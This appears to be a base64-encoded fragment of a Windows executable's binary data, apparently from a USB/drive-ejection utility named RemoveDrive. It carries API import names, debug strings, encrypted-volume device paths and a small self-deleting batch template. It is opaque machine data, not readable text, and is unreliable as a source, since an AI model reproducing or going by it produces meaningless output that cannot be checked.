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P1U7+20BGU8gCgyR77ixBj9VO/ttARlPIAoMke+4sSY/VTv7bQEZTyAKDJHvuLYP7MKjDB0hGwggCgyR77iyiKEH8zmDtLt4Asa1+lwGIlcyAlcwAAACAAAAAgRGV2aWNlAERSSVZFX1VOS05PV04AAABEUklWRV9OT19ST09UX0RJUgAAAERSSVZFX1JFTU9WQUJMRQBEUklWRV9GSVhFRABEUklWRV9SRU1PVEUAAAAARFJJVkVfQ0RST00ARFJJVkVfUkFNRElTSwAAAERSSVZFXzcARFJJVkVfJXUAAAAAdW5rbm93bgBubyByb290IGRpcmVjdG9yeQAAAHJlbW92YWJsZSBkcml2ZQBmaXhlZCBkcml2ZQBuZXR3b3JrIGRyaXZlAAAAQ0QtUk9NAABSQU0gZHJpdmUAAABVbmtub3duAEFUQVBJAAAAQVRBAEZpcmVXaXJlAAAAAEZpYnJlAAAAaVNDU0kAAABTQVMAU0FUQQAAAABTRAAATU1DAFZpcnR1YWwARmlsZUJhY2tlZFZpcnR1YWwAAABTcGFjZXMAADE3AAAxOAAAMTkAAExETQBfOgAAXERldmljZVxGbG9wcHkAAGZkYyNnZW5lcmljX2Zsb3BweV9kcml2ZQAAAABHREFQTl8xIGhWb2w9MHglcAAAAEdldERldmljZUFuZFBhcnRpdGlvbk51bWJlciBuYW1lPSVzIERldk51bT0laSBQYXJ0TnVtPSVpAAAAAEdldERpc2tDb3VudCglcykgcmVzPSV1AFN0b3JhZ2VWb2x1bWVJbmZvOjpQdXRFeFByb3BzIGk9JWkAAHVuZm9ybWF0dGVkAENTdG9yYWdlVm9sdW1lSW5mbzo6Q3JlYXRlU25hcHNob3QgU3RhcnQgJyVzJwAAAFBDSVwAAAAAU0NTSVwAAABQQ0lJREVcAFVTQlwAAAAAU0JQMlwAAAAxMzk0XAAAACZsZG0jewAAZmRjI2dlbmVyaWNfZmxvcHB5X2RyaXZlIwAAACBVMyAAAAAALS0tLS0tLS0tLS0tLS0AAHZvbFslaV09JXMgYnVzPSVpIGZsb3BweT0laSBkZXZudW09JWkgbXA9JXMAICB2bXA9JXMAAAAAICBkZXY9JWkgY2RpPSVpIGRvcz0lcyBmbj0lcwAAAAAAAAAAQ1N0b3JhZ2VWb2x1bWVJbmZvOjpDcmVhdGVTbmFwc2hvdCBGaW5pc2ggIENvdW50PSVpIENvdW50UmVhZHk9JWkAAABGVl8xAAAAAEZWXzIAAAAARXJyb3I6IGNhbm5vdCBoYW5kbGUgbW9yZSB0aGFuICV1IHZvbHVtZXMKAABGVl8zICAlcwAAAABGVl80IHJlcz0laSB2b2w9JXMAAGZsb3BweQAARlZfNQAAAABGVl82AAAAAEZWXzcgZHJpdmV0eXBlPSVzAAAARlZfOCBkZXZpY2VudW1iZXI9JWkgcGFydG51bWJlcj0laQAARlZfOQAAAAAnAAAAJywAAEZWXzEwIG1wPSVzAC0AAABGVl8xMQAAACVjOlwAAAAAJWM6XCVzAABGTVBfMQAAAEZNUF8yAAAAVU5LTk9XTgAAAAAAAAAAAE5PX1JPT1RfRElSAAAAAABEUklWRV9SRU1PVkFCTEUARFJJVkVfRklYRUQAAAAAAERSSVZFX1JFTU9URQAAAABEUklWRV9DRFJPTQAAAAAARFJJVkVfUkFNRElTSwAAAEluc3VmZmljaWVudFJpZ2h0cwAATGVnYWN5RHJpdmVyAAAAAE5vbkRpc2FibGVhYmxlAABJbnN1ZmZpY2llbnRQb3dlcgAAAElsbGVnYWxEZXZpY2VSZXF1ZXN0AAAAAERyaXZlcgAARGV2aWNlAABPdXRzdGFuZGluZ09wZW4AV2luZG93c1NlcnZpY2UAAFdpbmRvd3NBcHAAAFBlbmRpbmdDbG9zZQAAAABMZWdhY3lEZXZpY2UAAAAAVHlwZVVua25vd24Aa2VybmVsMzIuZGxsAAAAAEdldFZvbHVtZVBhdGhOYW1lc0ZvclZvbHVtZU5hbWVBAAAAAElzV293NjRQcm9jZXNzAABXAG8AVwA2ADQAAABXAGkAbgAzADIAAABcAAAAJWkuJWkuJWkuJWkAW1JlbW92ZURyaXZlXSAgJXMKAAAKJXMKAAAAACcsIAAuYmF0AAAAACVzZGVsXyVzJXMAAEBlY2hvIG9mZg0KOlJlcGVhdA0KZGVsICIlcyIgPk5VTCAxPk5VTCAyPk5VTA0KaWYgZXhpc3QgIiVzIiBnb3RvIFJlcGVhdA0KZGVsICIlcyIgPk5VTCAxPk5VTCAyPk5VTA0KAAAAVmV0b18ldQBsb2NrAAAAAApsb2NraW5nIH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JXAEwBU3RyVHJpbUEAAEgAUGF0aEZpbmRGaWxlTmFtZUEARgBQYXRoRmluZEV4dGVuc2lvbkEAAIwAUGF0aFJlbmFtZUV4dGVuc2lvbkEAAEEBU3RyU3RySUEAAA0BU3RyQ2hyQQBIAVN0clRvSW50QQAOAVN0ckNocklBAAAvAVN0ck5DYXRBAAA+AFBhdGhDb21wYWN0UGF0aEV4QQAAQgFTdHJTdHJJVwAAnwBQYXRoVW5xdW90ZVNwYWNlc1cAAFNITFdBUEkuZGxsAA8AR2V0TW9kdWxlRmlsZU5hbWVFeEEAAFBTQVBJLkRMTAACAEdldEZpbGVWZXJzaW9uSW5mb1NpemVBAAAAR2V0RmlsZVZlcnNpb25JbmZvQQAMAFZlclF1ZXJ5VmFsdWVBAABWRVJTSU9OLmRsbAD2AUdldE1vZHVsZUhhbmRsZUEAACACR2V0UHJvY0FkZHJlc3MAAGYCR2V0VGlja0NvdW50AACqAUdldEN1cnJlbnRQcm9jZXNzSWQArwRsc3RyY3B5QQAAMwNPcGVuUHJvY2VzcwDUAER1cGxpY2F0ZUhhbmRsZQCpAUdldEN1cnJlbnRQcm9jZXNzAEMAQ2xvc2VIYW5kbGUAZARXYWl0Rm9yU2luZ2xlT2JqZWN0AKMAQ3JlYXRlVGhyZWFkAAAhBFNsZWVwAMYBR2V0RXhpdENvZGVUaHJlYWQApgRsc3RyY2F0QQAAtQRsc3RybGVuQQAArARsc3RyY21waUEAHQFGaW5kRmlyc3RGaWxlQQAAyQFHZXRGaWxlQXR0cmlidXRlc0EAAHgAQ3JlYXRlRmlsZUEALgFGaW5kTmV4dEZpbGVBABkBRmluZENsb3NlAPQBR2V0TW9kdWxlRmlsZU5hbWVBAACnA1NldENvbnNvbGVDdHJsSGFuZGxlcgA7AkdldFN0ZEhhbmRsZQAAtwNTZXRDb25zb2xlTW9kZQAAmwFHZXRDb25zb2xlU2NyZWVuQnVmZmVySW5mbwAAEQJHZXROdW1iZXJPZkNvbnNvbGVJbnB1dEV2ZW50cwA8A1BlZWtDb25zb2xlSW5wdXRBAEABRmx1c2hDb25zb2xlSW5wdXRCdWZmZXIAoAFHZXRDb25zb2xlV2luZG93AABdA1JlYWRDb25zb2xlSW5wdXRBAMADU2V0Q29uc29sZVRleHRBdHRyaWJ1dGUAqwNTZXRDb25zb2xlQ3Vyc29yUG9zaXRpb24AAGEDUmVhZENvbnNvbGVPdXRwdXRBAACpBGxzdHJjbXBBAACIBFdyaXRlQ29uc29sZU91dHB1dEF0dHJpYnV0ZQA6A091dHB1dERlYnVnU3RyaW5nQQAAbwFHZXRDb21tYW5kTGluZUEAIwJHZXRQcm9jZXNzSGVhcAAAFQRTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIABAFFeGl0UHJvY2VzcwCdAkhlYXBBbGxvYwChAkhlYXBGcmVlAACNBFdyaXRlRmlsZQBaAkdldFRlbXBQYXRoQQAA8QJMb2FkTGlicmFyeUEAAK0BR2V0Q3VycmVudFRocmVhZElkAADmAUdldExhc3RFcnJvcgAATAFGcmVlTGlicmFyeQCyBGxzdHJjcHluQQDKAERldmljZUlvQ29udHJvbAC6AUdldERyaXZlVHlwZUEATQNRdWVyeURvc0RldmljZUEAfAJHZXRWb2x1bWVQYXRoTmFtZUEAAHoCR2V0Vm9sdW1lTmFtZUZvclZvbHVtZU1vdW50UG9pbnRBANIDU2V0RXJyb3JNb2RlAADcAUdldEZ1bGxQYXRoTmFtZUEAAKcBR2V0Q3VycmVudERpcmVjdG9yeUEAAIACR2V0V2luZG93c0RpcmVjdG9yeUEAAMYDU2V0Q3VycmVudERpcmVjdG9yeUEAAGAAQ29weUZpbGVBAKwAQ3JlYXRlVG9vbGhlbHAzMlNuYXBzaG90AABDA1Byb2Nlc3MzMkZpcnN0AABFA1Byb2Nlc3MzMk5leHQAHAJHZXRQcml2YXRlUHJvZmlsZVN0cmluZ0EAAJIEV3JpdGVQcml2YXRlUHJvZmlsZVN0cmluZ0EAAEEBRmx1c2hGaWxlQnVmZmVycwAAsARsc3RyY3B5VwAAdwJHZXRWb2x1bWVJbmZvcm1hdGlvbkEA7ANTZXRMYXN0RXJyb3IAACcBRmluZEZpcnN0Vm9sdW1lQQAAKAFGaW5kRmlyc3RWb2x1bWVNb3VudFBvaW50QQAAMwFGaW5kTmV4dFZvbHVtZU1vdW50UG9pbnRBADsBRmluZFZvbHVtZU1vdW50UG9pbnRDbG9zZQAyAUZpbmROZXh0Vm9sdW1lQQA6AUZpbmRWb2x1bWVDbG9zZQB1AkdldFZlcnNpb25FeEEAtQFHZXREaXNrRnJlZVNwYWNlRXhBAEcBRm9ybWF0TWVzc2FnZUEAAP0CTG9jYWxGcmVlANcDU2V0RmlsZUF0dHJpYnV0ZXNBAACUAENyZWF0ZVByb2Nlc3NBAAB6BFdpZGVDaGFyVG9NdWx0aUJ5dGUAtgRsc3RybGVuVwAAcgBDcmVhdGVFdmVudEEAABQCR2V0T3ZlcmxhcHBlZFJlc3VsdAAaA011bHRpQnl0ZVRvV2lkZUNoYXIAzgFHZXRGaWxlQXR0cmlidXRlc1cAAE4DUXVlcnlEb3NEZXZpY2VXALkARGVmaW5lRG9zRGV2aWNlQQAAaANSZWFkRmlsZQAAS0VSTkVMMzIuZGxsAAAHA3dzcHJpbnRmQQB9AUdldFdpbmRvdwAcAUdldERlc2t0b3BXaW5kb3cAAMoBSXNXaW5kb3dWaXNpYmxlAJABR2V0V2luZG93VGhyZWFkUHJvY2Vzc0lkAAA3AENoYXJVcHBlckEAAAABR2V0QXN5bmNLZXlTdGF0ZQAAMQFHZXRLZXlTdGF0ZQAzAENoYXJUb09lbUEAAAkDd3ZzcHJpbnRmQQAAKQBDaGFyTG93ZXJBAAC4AlNob3dXaW5kb3cAAHoCU2V0Rm9yZWdyb3VuZFdpbmRvdwD1AEZsYXNoV2luZG93RXgAYQJTZW5kTWVzc2FnZVRpbWVvdXRBAFVTRVIzMi5kbGwAAPEBT3BlblByb2Nlc3NUb2tlbgAAkAFMb29rdXBQcml2aWxlZ2VWYWx1ZUEAHgBBZGp1c3RUb2tlblByaXZpbGVnZXMAVAFHZXRUb2tlbkluZm9ybWF0aW9uAGcAQ29udmVydFNpZFRvU3RyaW5nU2lkQQAA8gFPcGVuU0NNYW5hZ2VyQQAA9AFPcGVuU2VydmljZUEAAFMAQ2xvc2VTZXJ2aWNlSGFuZGxlAAAiAlF1ZXJ5U2VydmljZVN0YXR1cwAAwAJTdGFydFNlcnZpY2VBAFgAQ29udHJvbFNlcnZpY2UAAEFEVkFQSTMyLmRsbAAAFAFTaGVsbEV4ZWN1dGVBAHwAU0hDaGFuZ2VOb3RpZnkAAFNIRUxMMzIuZGxsAFJTRFMzbbtAJ7LzToTiM8Y+vASlAQAAAHU6XDFTb3VyY2VcVkNcUmVtb3ZlRHJpdmUyODAwXFJlbGVhc2VcUmVtb3ZlRHJpdmUucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPTZQADo2UAAAAAAANjZQADI2UAAAAAAAADaQAAY2kAAAAAAABzYQAAM2EAA/NdAAPDXQADg10AA0NdAAMjXQADA10AAqNdAAJTXQACE10AAdNdAAGDXQAD/////7MZAAOTGQADZs0AAUmVtb3ZlRHJpdmUuZXhlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEVqZWN0TWVkaWEuZXhlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCaXRDb21ldC5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUG93ZXJEZXNrLmV4ZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRTVk5DYWNoZS5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABVU0JETE1fdXNyLmV4ZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbW9yZS5jb20AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRmcmdudGZzLmV4ZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkZnJnZmF0LmV4ZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZHdtLmV4ZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA